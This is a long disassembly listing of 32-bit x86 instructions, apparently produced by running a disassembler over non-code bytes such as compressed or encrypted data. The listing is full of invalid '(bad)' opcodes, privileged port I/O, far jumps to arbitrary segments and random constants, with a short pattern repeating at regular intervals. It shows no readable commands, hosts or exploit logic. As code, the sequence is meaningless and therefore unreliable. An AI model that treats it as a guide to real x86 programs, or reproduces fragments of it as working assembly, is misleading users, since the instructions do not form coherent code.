  41d945:	cmp    BYTE PTR [ecx-0x42],al
  41d948:	mov    edi,0xd5d2e5ec
  41d94d:	(bad)  
  41d94e:	jmp    0x2590:0x925f6d25
  41d955:	inc    esi
  41d956:	cmp    BYTE PTR [eax+edx*8+0x25],0x91
  41d95b:	lea    edi,[eax+0x266a9beb]
  41d961:	xchg   edi,eax
  41d962:	mov    ds:0x6fa8818e,eax
  41d967:	jecxz  0x41d9b4
  41d969:	push   0x2eaf1c1e
	...
  41d9d6:	les    ebp,FWORD PTR [edi+eax*1-0x64]
  41d9da:	scas   eax,DWORD PTR es:[edi]
  41d9db:	(bad)  
  41d9dc:	fistp  QWORD PTR [esp+ebx*8-0x4e]
  41d9e0:	outs   dx,DWORD PTR ds:[esi]
  41d9e1:	inc    BYTE PTR gs:[esi+0x3e67d990]
  41d9e8:	add    DWORD PTR [eax],eax
  41d9ea:	add    BYTE PTR [ecx],al
  41d9ec:	add    BYTE PTR [eax],al
  41d9ee:	test   eax,0x8156872a
  41d9f3:	add    ch,bl
  41d9f5:	(bad)
  41d9f8:	aad    0xb7
  41d9fa:	jne    0x41da05
  41d9fc:	push   edx
  41d9fd:	(bad)  
  41d9fe:	in     eax,0xa4
  41da00:	pop    ecx
  41da01:	push   edx
  41da02:	sahf   
  41da03:	sbb    al,0xad
  41da05:	cli    
  41da06:	inc    esp
  41da07:	aas    
  41da08:	iret   
  41da09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da0a:	inc    edx
  41da0b:	mov    ds:0x472b663c,eax
  41da10:	popf   
  41da11:	shl    DWORD PTR [edx-0x69],cl
  41da14:	loope  0x41da3a
  41da16:	jp     0x41da00
  41da18:	add    edx,edx
  41da1a:	jne    0x41d9b5
  41da1c:	je     0x41da76
  41da1e:	and    BYTE PTR [edi*2+0x661cf7],dl
  41da25:	mov    edx,0x64a7fc03
  41da2a:	jns    0x41da93
  41da2c:	jne    0x41da10
  41da2e:	dec    ebp
  41da2f:	jecxz  0x41da31
  41da31:	dec    ebx
  41da32:	sub    BYTE PTR [ebx],al
  41da34:	push   0xffffff8c
  41da36:	push   ebp
  41da37:	push   esi
  41da38:	ret    0x8334
  41da3b:	pop    esp
  41da3c:	inc    edi
  41da3d:	shrd   DWORD PTR [edi+0x10582b18],ebp,cl
  41da44:	lahf   
  41da45:	sub    ch,BYTE PTR [esi-0x70]
  41da48:	ja     0x41dac1
  41da4a:	xchg   edi,eax
  41da4b:	or     al,0xe1
  41da4d:	(bad)  
  41da4e:	in     al,dx
  41da4f:	popa   
  41da50:	jb     0x41da5a
  41da52:	cmp    BYTE PTR [ebx-0x1c],ah
  41da55:	retf   
  41da56:	cwde   
  41da57:	rcr    DWORD PTR [esi],cl
  41da59:	int    0x88
  41da5b:	lock cdq 
  41da5d:	cmp    al,0x8
  41da5f:	xchg   esi,eax
  41da60:	cmc    
  41da61:	jb     0x41da18
  41da63:	add    DWORD PTR [edx+0x6f],eax
  41da66:	(bad)  
  41da67:	(bad)  [edi]
  41da69:	mov    bl,0x49
  41da6b:	sub    eax,0xfbbbdae3
  41da70:	jmp    0xea6b:0x69999481
  41da77:	shl    DWORD PTR [edi+0x3c],1
  41da7a:	sti    
  41da7b:	sbb    BYTE PTR [ebx-0x6fed7bf1],0xb7
  41da82:	retf   
  41da83:	sbb    DWORD PTR [edx],edx
  41da85:	dec    ecx
  41da86:	xor    bh,BYTE PTR [eax+0x6692d743]
  41da8c:	adc    ebx,ebx
  41da8e:	mov    ecx,0x1896a361
  41da93:	stos   DWORD PTR es:[edi],eax
  41da94:	sbb    DWORD PTR [edx-0x1e8fca3c],0xffffffb3
  41da9b:	mov    ecx,0x8e1f4687
  41daa0:	mov    cl,0xf6
  41daa2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41daa3:	xchg   edi,eax
  41daa4:	push   ds
  41daa5:	jo     0x41dabe
  41daa7:	rcl    DWORD PTR [edx-0x888b26a],0xb1
  41daae:	adc    bh,BYTE PTR [edx]
  41dab0:	int    0x3e
  41dab2:	dec    eax
  41dab3:	mov    ds:0x81c1c3d9,al
  41dab8:	mov    ebx,0xadc8863e
  41dabd:	enter  0x7ee1,0xf9
  41dac1:	push   eax
  41dac2:	les    eax,FWORD PTR [ebx]
  41dac4:	jo     0x41db32
  41dac6:	outs   dx,DWORD PTR ds:[esi]
  41dac7:	fmulp  st(3),st
  41dac9:	fisubr WORD PTR ds:0x201f6848
  41dacf:	stc    
  41dad0:	pop    edi
  41dad1:	idiv   BYTE PTR [eax+0x114a151b]
  41dad7:	xor    BYTE PTR [ecx+0x6750eafe],ch
  41dadd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dade:	(bad)  
  41dae0:	mov    ebx,0xf6dba0a5
  41dae5:	arpl   WORD PTR [ebp-0x646a7b55],si
  41daeb:	add    ah,ah
  41daed:	jle    0x41daef
	...
  41db53:	add    BYTE PTR [eax],al
  41db55:	add    BYTE PTR [edx*1+0x7f7b537b],bl
  41db5c:	cmp    al,0x5f
  41db5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db5f:	push   edi
  41db60:	sbb    ebp,0xffffffd7
  41db63:	fs int3 
  41db65:	das    
  41db66:	addr16 aas 
  41db68:	add    DWORD PTR [eax],eax
  41db6a:	add    BYTE PTR [ecx],al
  41db6c:	add    BYTE PTR [eax],al
  41db6e:	pop    esp
  41db6f:	pushf  
  41db70:	mov    ds:0x49c4d5b8,eax
  41db75:	mov    cl,0xf9
  41db77:	popf   
  41db78:	push   ss
  41db79:	pop    ds
  41db7a:	add    esp,DWORD PTR [edx-0x65cd8cd7]
  41db80:	jecxz  0x41db34
  41db82:	loope  0x41db47
  41db84:	cmp    BYTE PTR [eax],ch
  41db86:	push   edx
  41db87:	mov    edx,0x2c4963df
  41db8c:	jo     0x41db0e
  41db8e:	out    0x73,eax
  41db90:	xchg   BYTE PTR [esi-0x7e4e4dab],cl
  41db96:	add    DWORD PTR [edx-0x7b4450b6],edx
  41db9c:	push   ds
  41db9d:	sahf   
  41db9e:	or     ebx,DWORD PTR [edi-0x413ae0bc]
  41dba4:	dec    ebp
  41dba5:	test   DWORD PTR [ebx],ebp
  41dba7:	jae    0x41dbd6
  41dba9:	mov    bl,0xb9
  41dbab:	fxch   st(5)
  41dbad:	push   ebp
  41dbae:	dec    dx
  41dbb0:	imul   edx,DWORD PTR [edx],0x4f
  41dbb3:	jg     0x41db5b
  41dbb5:	sbb    DWORD PTR [edx-0x77],esp
  41dbb8:	fwait
  41dbb9:	push   ecx
  41dbba:	das    
  41dbbb:	fnstsw WORD PTR [ebp+0x3e6e7da6]
  41dbc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dbc2:	leave  
  41dbc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dbc4:	daa    
  41dbc5:	jge    0x41dbb9
  41dbc7:	push   ss
  41dbc8:	push   cs
  41dbc9:	pop    edx
  41dbca:	loopne 0x41dbb1
  41dbcc:	mov    edi,0x209c8863
  41dbd1:	mov    dl,0xb5
  41dbd3:	push   cs
  41dbd4:	dec    ecx
  41dbd5:	mov    ch,0x92
  41dbd7:	out    dx,eax
  41dbd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dbd9:	sub    DWORD PTR [ebx-0x66d607fa],eax
  41dbdf:	sub    eax,0xadb7e7c0
  41dbe4:	mov    BYTE PTR [esi+eax*2-0x6d],ah
  41dbe8:	mov    cl,0xac
  41dbea:	push   es
  41dbeb:	xchg   BYTE PTR [edi+0x61e38b3],al
  41dbf1:	sbb    esp,DWORD PTR [esi-0x58]
  41dbf4:	inc    esi
  41dbf5:	out    dx,al
  41dbf6:	dec    ebp
  41dbf7:	adc    DWORD PTR [ecx+0x16],0x18d7e184
  41dbfe:	(bad)  [edi+0x3dc6496a]
  41dc04:	test   eax,0xf40dbaa7
  41dc09:	add    al,0x50
  41dc0b:	mov    ds:0x3ce0d1b7,al
  41dc10:	lock xchg ebp,eax
  41dc12:	jns    0x41dc45
  41dc14:	cli    
  41dc15:	lds    ebp,FWORD PTR [ebx+0x2b6d645b]
  41dc1b:	loope  0x41dbcf
  41dc1d:	dec    ebx
  41dc1e:	or     al,BYTE PTR [edx-0x22]
  41dc21:	and    BYTE PTR [edi+0x599be45c],dh
  41dc27:	xlat   BYTE PTR ds:[ebx]
  41dc28:	div    BYTE PTR [edi-0x2224b99]
  41dc2e:	(bad)  
  41dc30:	clc    
  41dc31:	test   eax,0xfe19a0fb
  41dc36:	icebp  
  41dc37:	mov    esp,0x2034591a
  41dc3c:	push   0x50fbd780
  41dc41:	inc    ebx
  41dc42:	jno    0x41dc4d
  41dc44:	jb     0x41dc5f
  41dc46:	cs faddp st(6),st
  41dc49:	mov    ecx,0x70e460d8
  41dc4e:	ds out 0x86,eax
  41dc51:	xchg   ebp,eax
  41dc52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc53:	stos   BYTE PTR es:[edi],al
  41dc54:	add    bh,dl
  41dc56:	aad    0x2f
  41dc58:	out    0xb4,eax
  41dc5a:	mov    cl,bl
  41dc5c:	xchg   edi,eax
  41dc5d:	sbb    eax,0x3b881a28
  41dc62:	(bad)  
  41dc63:	xchg   edi,eax
  41dc64:	add    eax,0x844b2727
  41dc69:	jge    0x41dcd2
  41dc6b:	jno    0x41dc49
  41dc6d:	add    BYTE PTR cs:[eax],al
	...
  41dcd4:	add    BYTE PTR [eax],al
  41dcd6:	outs   dx,DWORD PTR ds:[esi]
  41dcd7:	retf   0x9815
  41dcda:	mov    ch,0xdf
  41dcdc:	out    dx,eax
  41dcdd:	jmp    DWORD PTR [edi+0x73b0d050]
  41dce3:	and    ch,BYTE PTR [si+0x4067]
  41dce8:	add    DWORD PTR [eax],eax
  41dcea:	add    BYTE PTR [ecx],al
  41dcec:	add    BYTE PTR [eax],al
  41dcee:	push   esp
  41dcef:	dec    edi
  41dcf0:	cmp    esp,ebp
  41dcf2:	xchg   ebx,eax
  41dcf3:	call   0x23aa7560
  41dcf8:	scas   eax,DWORD PTR es:[edi]
  41dcf9:	mov    DWORD PTR [esp+eax*8+0x4cfb4bd9],edi
  41dd00:	cmp    al,0x7
  41dd02:	out    0xd5,eax
  41dd04:	std    
  41dd05:	and    dh,dl
  41dd07:	test   BYTE PTR [edi+0x39874315],bh
  41dd0d:	push   ss
  41dd0e:	rcl    BYTE PTR [edx-0x2d],cl
  41dd11:	test   al,0x79
  41dd13:	std    
  41dd14:	xor    dh,BYTE PTR [ebx+0x6ada651b]
  41dd1a:	mov    ecx,0x8f801b70
  41dd1f:	fidivr DWORD PTR [ebx-0x13]
  41dd22:	sub    DWORD PTR [ecx+0x2],0xffffffc3
  41dd26:	std    
  41dd27:	add    eax,0xc818b118
  41dd2c:	sub    al,0xc3
  41dd2e:	fidivr DWORD PTR [esi-0x5b]
  41dd31:	push   edi
  41dd32:	fistp  WORD PTR [ecx-0x64f6a903]
  41dd38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd39:	push   esi
  41dd3a:	xchg   edx,eax
  41dd3b:	int    0x61
  41dd3d:	popf   
  41dd3e:	pusha  
  41dd3f:	pusha  
  41dd40:	loope  0x41dd70
  41dd42:	or     esp,DWORD PTR [ebx+0x6451791e]
  41dd48:	push   0x24e5da91
  41dd4d:	ficomp DWORD PTR [ecx+0x62]
  41dd50:	mov    al,ds:0x5a73e935
  41dd55:	push   es
  41dd56:	fisttp DWORD PTR [eax+0x30]
  41dd59:	cmp    edx,DWORD PTR [eax+0x1d]
  41dd5c:	inc    ebx
  41dd5d:	jo     0x41dd79
  41dd5f:	fist   DWORD PTR [edx]
  41dd61:	push   0x8bb193ce
  41dd66:	daa    
  41dd67:	cmc    
  41dd68:	xor    BYTE PTR [edi],ah
  41dd6a:	sub    dh,BYTE PTR [eax]
  41dd6c:	ror    BYTE PTR [eax+0x47],cl
  41dd6f:	cmp    bl,ah
  41dd71:	outs   dx,BYTE PTR ds:[esi]
  41dd72:	push   cs
  41dd73:	lock into 
  41dd75:	les    esi,FWORD PTR [ebx]
  41dd77:	(bad)  
  41dd79:	and    al,bl
  41dd7b:	cwde   
  41dd7c:	dec    edx
  41dd7d:	inc    ebp
  41dd7e:	sti    
  41dd7f:	sub    dl,0xc
  41dd82:	stc    
  41dd83:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd85:	fdivr  QWORD PTR [ebp-0x7ccf0833]
  41dd8b:	ins    DWORD PTR es:[edi],dx
  41dd8c:	pop    esi
  41dd8d:	or     al,0x14
  41dd8f:	lahf   
  41dd90:	in     al,dx
  41dd91:	sahf   
  41dd92:	scas   eax,DWORD PTR es:[edi]
  41dd93:	dec    ebx
  41dd94:	hlt    
  41dd95:	test   DWORD PTR [eax],esi
  41dd97:	outs   dx,BYTE PTR ds:[esi]
  41dd98:	and    edx,DWORD PTR ds:0xbb5f470d
  41dd9e:	push   0x4f9c7956
  41dda3:	dec    edx
  41dda4:	sti    
  41dda5:	xchg   DWORD PTR [ecx],ebx
  41dda7:	fwait
  41dda8:	fwait
  41dda9:	jb     0x41dd6e
  41ddab:	xchg   edx,eax
  41ddac:	fdiv   DWORD PTR [esi+0x182947ca]
  41ddb2:	sbb    BYTE PTR [ecx],0xf5
  41ddb5:	retf   
  41ddb6:	popa   
  41ddb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ddb8:	jb     0x41de25
  41ddba:	push   eax
  41ddbb:	stc    
  41ddbc:	pop    ss
  41ddbd:	adc    ebx,DWORD PTR [edx-0x3a]
  41ddc0:	dec    eax
  41ddc1:	add    eax,0x94126315
  41ddc6:	addr16 out 0xef,al
  41ddc9:	fwait
  41ddca:	jecxz  0x41dd5e
  41ddcc:	out    dx,eax
  41ddcd:	dec    esi
  41ddce:	clc    
  41ddcf:	add    al,BYTE PTR [ecx+esi*2-0x6b]
  41ddd3:	inc    ecx
  41ddd4:	sahf   
  41ddd5:	mov    eax,DWORD PTR [edx-0x7cfc7172]
  41dddb:	push   ebx
  41dddc:	leave  
  41dddd:	aam    0xaf
  41dddf:	inc    esi
  41dde0:	arpl   WORD PTR [eax],sp
  41dde2:	in     al,0x91
  41dde4:	and    BYTE PTR [edx+edi*8-0x75],dh
  41dde8:	dec    esp
  41dde9:	ror    DWORD PTR ds:0xc7587,1
	...
  41de53:	add    BYTE PTR [eax],al
  41de55:	add    BYTE PTR [eax],ah
  41de57:	repz das 
  41de59:	cmp    bh,0xde
  41de5c:	lods   eax,DWORD PTR ds:[esi]
  41de5d:	repz pop ds
  41de5f:	mov    bl,BYTE PTR [esi-0x41]
  41de62:	lods   al,BYTE PTR ds:[esi]
  41de63:	dec    esp
  41de64:	cmp    bl,BYTE PTR [edx+0x67]
  41de67:	inc    ecx
  41de68:	add    DWORD PTR [eax],eax
  41de6a:	add    BYTE PTR [ecx],al
  41de6c:	add    BYTE PTR [eax],al
  41de6e:	pop    edi
  41de6f:	jnp    0x41de65
  41de71:	xor    BYTE PTR [esi-0x46],dl
  41de74:	lock jne 0x41ded1
  41de77:	sbb    edi,DWORD PTR [eax]
  41de79:	outs   dx,DWORD PTR ds:[esi]
  41de7a:	push   edx
  41de7b:	call   0x99967f7c
  41de80:	mov    ds:0xfa554878,al
  41de85:	pop    edx
  41de86:	sar    bh,1
  41de88:	std    
  41de89:	test   eax,0x2f56fbdc
  41de8e:	repnz mov al,ah
  41de91:	inc    esp
  41de92:	loope  0x41debe
  41de94:	out    dx,al
  41de95:	and    al,0x97
  41de97:	sub    al,0x88
  41de99:	xlat   BYTE PTR ds:[ebx]
  41de9a:	test   bl,al
  41de9c:	jle    0x41de40
  41de9e:	rol    BYTE PTR [eax+0x2561d5d1],cl
  41dea4:	jne    0x41de54
  41dea6:	(bad)  
  41dea7:	out    dx,eax
  41dea8:	push   edi
  41dea9:	and    al,0x88
  41deab:	lea    edi,[esp+eiz*2]
  41deae:	push   ebx
  41deaf:	push   esp
  41deb0:	xlat   BYTE PTR ds:[ebx]
  41deb1:	mov    dh,BYTE PTR [eax-0x7f7cb65e]
  41deb7:	stos   DWORD PTR es:[edi],eax
  41deb8:	icebp  
  41deb9:	outs   dx,DWORD PTR ds:[esi]
  41deba:	outs   dx,BYTE PTR ds:[esi]
  41debb:	stos   BYTE PTR es:[edi],al
  41debc:	cmovle eax,DWORD PTR [ebp+edi*4-0x1c]
  41dec1:	ins    BYTE PTR es:[edi],dx
  41dec2:	ror    BYTE PTR [esi],0x20
  41dec5:	xchg   ebx,eax
  41dec6:	lock mov ebp,esi
  41dec9:	mov    al,ds:0xa8a8b172
  41dece:	cwde   
  41decf:	pop    eax
  41ded0:	push   edi
  41ded1:	dec    esi
  41ded2:	xlat   BYTE PTR ds:[ebx]
  41ded3:	jmp    0x41ded2
  41ded5:	mov    eax,0x1aa7a7c7
  41deda:	push   edx
  41dedb:	sbb    edx,0xffffffb4
  41dede:	test   al,0xc3
  41dee0:	cld    
  41dee1:	fs push edx
  41dee3:	mov    ds:0x3ba58bfb,eax
  41dee8:	movzx  edi,sp
  41deeb:	mov    ch,0xdf
  41deed:	jl     0x41df2b
  41deef:	(bad)  
  41def0:	pop    esi
  41def1:	fs call 0xab52:0xbc545dd
  41def9:	stos   DWORD PTR es:[edi],eax
  41defa:	div    BYTE PTR ds:0xa83934dc
  41df00:	lods   eax,DWORD PTR gs:[esi]
  41df02:	dec    esi
  41df03:	rcr    BYTE PTR [edx-0x4b],cl
  41df06:	jl     0x41dec1
  41df08:	jno    0x41dea2
  41df0a:	pop    esi
  41df0b:	mov    cl,0x88
  41df0d:	mov    cl,0xab
  41df0f:	and    eax,0x507b517
  41df14:	jns    0x41de9e
  41df16:	jmp    0xff7b:0x50f912d
  41df1d:	push   es
  41df1e:	mov    ebp,ebp
  41df20:	call   0x99f5fb8
  41df25:	scas   eax,DWORD PTR es:[edi]
  41df26:	retf   0x503e
  41df29:	sbb    DWORD PTR [eax+0x54],0x54
  41df2d:	and    al,0xcc
  41df2f:	add    bl,BYTE PTR [ebp+0x2a]
  41df32:	out    0xd2,al
  41df34:	cmp    edi,DWORD PTR [esi+0x308c7052]
  41df3a:	cmp    esi,DWORD PTR [eax+edi*4]
  41df3d:	sbb    bh,BYTE PTR [ebx+edi*2]
  41df40:	jl     0x41df5e
  41df42:	imul   esi,DWORD PTR [edi-0x6ae58276],0xffffffc0
  41df49:	test   al,0xae
  41df4b:	xor    bh,cl
  41df4d:	and    bh,BYTE PTR ds:0xc09965a9
  41df53:	pop    es
  41df54:	push   gs
  41df56:	or     eax,DWORD PTR [ecx+0x13]
  41df59:	aaa    
  41df5a:	cdq    
  41df5b:	das    
  41df5c:	retf   0x6c45
  41df5f:	push   eax
  41df60:	push   es
  41df61:	push   0xeeb090e9
  41df66:	mov    esi,0xe10f3672
  41df6b:	sbb    ch,BYTE PTR [ebp+0x1e]
	...
  41dfd6:	aas    
  41dfd7:	daa    
  41dfd8:	push   ss
  41dfd9:	cld    
  41dfda:	push   ds
  41dfdb:	std    
  41dfdc:	jmp    edi
  41dfde:	dec    edi
  41dfdf:	push   0xe7499ce9
  41dfe4:	push   edi
  41dfe5:	shl    BYTE PTR [edi+0x42],cl
  41dfe8:	add    DWORD PTR [eax],eax
  41dfea:	add    BYTE PTR [ecx],al
  41dfec:	add    BYTE PTR [eax],al
  41dfee:	pop    ss
  41dfef:	fst    DWORD PTR [ebp+0x48]
  41dff2:	sub    al,bh
  41dff4:	adc    DWORD PTR [ebp-0x1b],esi
  41dff7:	rcl    bl,1
  41dff9:	inc    ebp
  41dffa:	push   es
  41dffb:	fcomp  st(5)
  41dffd:	lahf   
  41dffe:	out    dx,eax
  41dfff:	imul   edx,DWORD PTR [ebx-0x421f7de6],0xffffffbc
  41e006:	pop    ds
  41e007:	sti    
  41e008:	dec    ebp
  41e009:	fimul  WORD PTR [esi-0x63]
  41e00c:	dec    edi
  41e00d:	lock mov eax,0x6331aedb
  41e013:	int    0x61
  41e015:	(bad)  
  41e016:	sti    
  41e017:	(bad)  
  41e018:	pop    ebx
  41e019:	test   al,0xb6
  41e01b:	and    al,0x28
  41e01d:	cli    
  41e01e:	lock out dx,eax
  41e020:	pushf  
  41e021:	and    ecx,0x5313c665
  41e027:	dec    ebp
  41e028:	gs mov al,0xfc
  41e02b:	mov    WORD PTR ds:0xab6aec5a,ss
  41e031:	test   al,0x8c
  41e033:	adc    esi,eax
  41e035:	xchg   cx,ax
  41e037:	iret   
  41e038:	repz xchg ecx,eax
  41e03a:	sbb    BYTE PTR [ebx],0x30
  41e03d:	push   ebx
  41e03e:	push   0x4711c2be
  41e043:	xor    eax,ecx
  41e045:	inc    ecx
  41e046:	cmp    edx,DWORD PTR [ebp+edi*1+0x60444875]
  41e04d:	cmp    BYTE PTR [ebx+0x72],0x79
  41e051:	push   0x39718563
  41e056:	outs   dx,DWORD PTR ds:[esi]
  41e057:	cs (bad) 
  41e059:	imul   ebx,DWORD PTR [ebx+0x7c],0x66
  41e05d:	ror    BYTE PTR [edx],1
  41e05f:	mov    ebp,0x44496c14
  41e064:	addr16 icebp 
  41e066:	mov    ecx,ecx
  41e068:	pusha  
  41e069:	lahf   
  41e06a:	fild   WORD PTR [eax+0x7]
  41e06d:	or     al,0xcb
  41e06f:	jp     0x41e03d
  41e071:	jnp    0x41e008
  41e073:	in     al,0x43
  41e075:	adc    cl,bh
  41e077:	aam    0x70
  41e079:	sbb    DWORD PTR [ecx-0x1a],ebx
  41e07c:	xlat   BYTE PTR ds:[ebx]
  41e07d:	mov    esi,0xe80b0677
  41e082:	adc    DWORD PTR [eax],edi
  41e084:	inc    edi
  41e085:	cmc    
  41e086:	stos   DWORD PTR es:[edi],eax
  41e087:	adc    BYTE PTR [ebx+0x97068c8],dh
  41e08d:	aad    0xde
  41e08f:	ins    BYTE PTR es:[edi],dx
  41e090:	ret    
  41e091:	lahf   
  41e092:	mov    al,0x6
  41e094:	mov    al,ds:0xaaea7a75
  41e099:	jbe    0x41e0ce
  41e09b:	test   al,0xf3
  41e09d:	dec    esi
  41e09e:	add    esi,0xe725cfdb
  41e0a4:	push   ebx
  41e0a5:	mov    bh,0xf6
  41e0a7:	push   cs
  41e0a8:	sahf   
  41e0a9:	ins    BYTE PTR es:[edi],dx
  41e0aa:	retf   
  41e0ab:	push   ebp
  41e0ac:	fadd   DWORD PTR [edx]
  41e0ae:	jnp    0x41e124
  41e0b0:	push   esi
  41e0b2:	push   eax
  41e0b3:	push   esi
  41e0b4:	or     al,0x4f
  41e0b6:	jl     0x41e118
  41e0b8:	xchg   bl,dh
  41e0ba:	xchg   DWORD PTR [edx],esi
  41e0bc:	scas   al,BYTE PTR es:[edi]
  41e0bd:	imul   esi,DWORD PTR [ebx],0x1e5b8117
  41e0c3:	dec    ecx
  41e0c4:	push   ebx
  41e0c5:	outs   dx,BYTE PTR ds:[esi]
  41e0c6:	push   esi
  41e0c7:	ins    BYTE PTR es:[edi],dx
  41e0c8:	call   0xf711fc94
  41e0cd:	inc    edi
  41e0ce:	xchg   esp,eax
  41e0cf:	push   cs
  41e0d0:	adc    al,0xef
  41e0d2:	sbb    ebx,edi
  41e0d4:	outs   dx,BYTE PTR ds:[esi]
  41e0d5:	add    eax,0xc56c418c
  41e0da:	mov    ebx,0x76e34c43
  41e0df:	cli    
  41e0e0:	cmc    
  41e0e1:	sbb    al,0xbf
  41e0e3:	jle    0x41e097
  41e0e5:	pop    ds
  41e0e6:	rol    bl,1
  41e0e8:	sub    esp,esp
  41e0ea:	mov    ecx,0x7f4e01
	...
  41e153:	add    BYTE PTR [eax],al
  41e155:	add    BYTE PTR [edi+0x53],cl
  41e158:	add    al,0xc
  41e15a:	sbb    al,0x5f
  41e15c:	dec    edi
  41e15d:	push   ebx
  41e15e:	out    0x6d,eax
  41e160:	aad    0x48
  41e162:	pop    ss
  41e163:	push   ds
  41e164:	in     eax,0xb0
  41e166:	addr16 inc ebx
  41e168:	add    DWORD PTR [eax],eax
  41e16a:	add    BYTE PTR [ecx],al
  41e16c:	add    BYTE PTR [eax],al
  41e16e:	xchg   ecx,ebp
  41e170:	mov    BYTE PTR [edx],dh
  41e172:	aas    
  41e173:	es in  al,0xaf
  41e176:	loope  0x41e1b3
  41e178:	xchg   ebp,eax
  41e179:	xchg   ebx,eax
  41e17a:	sub    DWORD PTR ds:0xcd711404,esp
  41e180:	cmp    BYTE PTR [esi-0x12b52c29],ch
  41e186:	in     eax,0x98
  41e188:	or     al,0x58
  41e18a:	push   ecx
  41e18b:	cmp    BYTE PTR [eax+0x7cc78f6c],dh
  41e191:	ret    0x49d6
  41e194:	pop    ebp
  41e195:	pop    edi
  41e196:	fist   DWORD PTR [ecx]
  41e198:	bound  edx,QWORD PTR [ecx-0x75]
  41e19b:	push   eax
  41e19c:	das    
  41e19d:	fidiv  WORD PTR [ebx+edx*8]
  41e1a0:	(bad)  
  41e1a1:	bound  edi,QWORD PTR [ecx-0x58169d95]
  41e1a7:	into   
  41e1a8:	aaa    
  41e1a9:	jo     0x41e1a4
  41e1ab:	inc    edx
  41e1ac:	and    eax,0x7dc56abc
  41e1b1:	icebp  
  41e1b2:	pop    ebp
  41e1b3:	sti    
  41e1b4:	rcr    DWORD PTR [ebp+ebx*8+0x5a],cl
  41e1b8:	(bad)  
  41e1b9:	and    eax,0x574e57f9
  41e1be:	mov    edx,DWORD PTR [edi+edx*1-0x25]
  41e1c2:	enter  0xb373,0x80
  41e1c6:	call   0x78dd:0x595f54e8
  41e1cd:	aad    0xcc
  41e1cf:	(bad)  
  41e1d0:	out    dx,al
  41e1d1:	sub    BYTE PTR [edx],dl
  41e1d3:	jp     0x41e1e8
  41e1d5:	jmp    0x423ae4cc
  41e1da:	pop    ebp
  41e1db:	adc    eax,DWORD PTR [eax-0x6a]
  41e1de:	push   esi
  41e1df:	fsubr  QWORD PTR [edi-0x5f]
  41e1e2:	scas   eax,DWORD PTR es:[edi]
  41e1e3:	adc    al,BYTE PTR [eax+0xb]
  41e1e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e1e7:	fs stc 
  41e1e9:	fistp  DWORD PTR [ebp-0x61]
  41e1ec:	inc    edx
  41e1ed:	pusha  
  41e1ee:	pop    edi
  41e1ef:	ret    0x9a1b
  41e1f2:	push   esp
  41e1f3:	cmp    eax,0x731a7aae
  41e1f8:	aam    0x3f
  41e1fa:	cmovno edi,DWORD PTR [eax]
  41e1fd:	mov    ds:0xb0e37c56,al
  41e202:	call   0xe197073d
  41e207:	rcl    BYTE PTR [edi+edi*2-0x3b],1
  41e20b:	hlt    
  41e20c:	xchg   esp,eax
  41e20d:	dec    eax
  41e20e:	ins    BYTE PTR es:[edi],dx
  41e20f:	daa    
  41e210:	jno    0x41e254
  41e212:	les    eax,FWORD PTR [edi-0x36f7b1d8]
  41e218:	inc    edx
  41e219:	aam    0x3
  41e21b:	cmp    al,0x44
  41e21d:	scas   al,BYTE PTR es:[edi]
  41e21e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e21f:	idiv   BYTE PTR [ecx+0x39]
  41e222:	jne    0x41e239
  41e224:	jle    0x41e202
  41e226:	fadd   DWORD PTR [ebx+ebx*4]
  41e229:	nop
  41e22a:	rcl    BYTE PTR [esi+ebx*2-0x20],cl
  41e22e:	es aaa 
  41e230:	and    eax,0xffd8aea9
  41e235:	retf   0x43e3
  41e238:	js     0x41e228
  41e23a:	aad    0xd9
  41e23c:	xor    ah,BYTE PTR [esi+ebx*1+0x3233715c]
  41e243:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e244:	out    0x5b,eax
  41e246:	sub    esp,DWORD PTR [eax+eiz*1]
  41e249:	cmp    eax,DWORD PTR [eax+0x70309af8]
  41e24f:	je     0x41e2c6
  41e251:	inc    edi
  41e252:	sbb    BYTE PTR [edx+0x45f7b3cf],0xff
  41e259:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e25a:	retf   0x3624
  41e25d:	pop    eax
  41e25e:	inc    ebp
  41e25f:	xchg   esi,eax
  41e260:	cmp    DWORD PTR ds:0x4bab2281,ebx
  41e266:	ins    DWORD PTR es:[edi],dx
  41e267:	push   esp
  41e268:	pop    esi
  41e269:	mov    dh,0x2e
  41e26b:	pop    esp
  41e26c:	ss out dx,al
	...
  41e2d6:	stos   DWORD PTR es:[edi],eax
  41e2d7:	add    dh,BYTE PTR [edi-0x1a]
  41e2da:	push   edi
  41e2dc:	mov    ebx,0x6f64c34f
  41e2e1:	or     al,0x95
  41e2e3:	push   0x44676bcc
  41e2e8:	add    DWORD PTR [eax],eax
  41e2ea:	add    BYTE PTR [ecx],al
  41e2ec:	add    BYTE PTR [eax],al
  41e2ee:	repnz sbb ebp,ebx
  41e2f1:	int    0xd7
  41e2f3:	cmp    BYTE PTR [eax],bl
  41e2f5:	ja     0x41e2ae
  41e2f7:	aam    0x71
  41e2f9:	test   edx,ebx
  41e2fb:	push   0xffffff8a
  41e2fd:	imul   ebp,DWORD PTR [eax+0x67de7149],0x9eb5e297
  41e307:	(bad)  
  41e308:	outs   dx,BYTE PTR ds:[esi]
  41e309:	out    dx,eax
  41e30a:	pop    ebp
  41e30b:	xchg   ebp,eax
  41e30c:	out    0x71,eax
  41e30e:	jo     0x41e2c9
  41e310:	imul   ebp,DWORD PTR [esi],0x36
  41e313:	cmp    eax,0x3395a959
  41e318:	shl    eax,1
  41e31a:	cli    
  41e31b:	sar    DWORD PTR [edi],cl
  41e31d:	mov    ebp,ss
  41e31f:	fmul   DWORD PTR [esi]
  41e321:	mov    dh,0x4b
  41e324:	xchg   edi,eax
